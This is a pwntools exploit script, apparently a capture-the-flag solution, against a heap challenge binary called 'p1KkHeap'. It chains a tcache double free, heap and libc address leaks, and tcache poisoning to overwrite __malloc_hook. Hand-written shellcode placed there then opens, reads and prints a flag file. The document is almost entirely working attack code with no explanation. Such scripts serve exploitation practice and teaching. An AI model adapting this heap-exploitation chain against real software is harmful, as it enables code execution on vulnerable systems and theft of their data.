from pwn import *  
  
#sh = process('./p1KkHeap')  
context(arch='amd64',os='linux')  
p = process("./p1KkHeap", env={"LD_PRELOAD":"./libc.so.6"})
#libc_path = '/lib/x86_64-linux-gnu/libc-2.27.so'  
libc_path = './libc.so.6'  
libc = ELF(libc_path)  
malloc_hook_s = libc.symbols['__malloc_hook']  
open_s = libc.sym['open']  
read_s = libc.sym['read']  
write_s = libc.sym['write']  
  
def create(size):  
   p.sendlineafter('Your Choice:','1')  
   p.sendlineafter('size:',str(size))  
  
def show(index):  
   p.sendlineafter('Your Choice:','2')  
   p.sendlineafter('id:',str(index))  
  
def edit(index,content):  
   p.sendlineafter('Your Choice:','3')  
   p.sendlineafter('id:',str(index))  
   p.sendafter('content:',content)  
  
def delete(index):  
   p.sendlineafter('Your Choice:','4')  
   p.sendlineafter('id:',str(index))


create(0x100)
create(0x18)

delete(0)
delete(0)

show(0)
p.recvuntil(": ")
heap_addr = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x10
tcache_head = heap_addr - 0x188
log.info("HEAP:    0x%x" %(tcache_head))

create(0x100)
edit(2, p64(tcache_head))

create(0x100)
create(0x100)

delete(0)
show(0)
p.recvuntil(": ")
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 0x3ebca0
log.info("LEAK:   0x%x" %(libc.address))

edit(4, p64(0x0000000066660000))

shellcode = asm("""
           mov rax, 0x7478742E67616C66
           push 0x0
           push rax
           mov rsi, 0
           mov rdi, rsp
           mov rax, 0x%x
           call rax

           mov rdi, rax
           mov rsi, rsp
           mov rdx, 0x30
           mov rax, 0x%x
           call rax

           mov rdi, 0x1
           mov rsi, rsp
           mov rdx, 0x30
           mov rax, 0x%x
           call rax""" %(libc.symbols['open'], libc.symbols['read'], libc.symbols['write']))





create(0x100)
edit(5, shellcode)


edit(4, p64(libc.symbols['__malloc_hook']))
create(0x100)
edit(6, p64(0x0000000066660000))
p.interactive()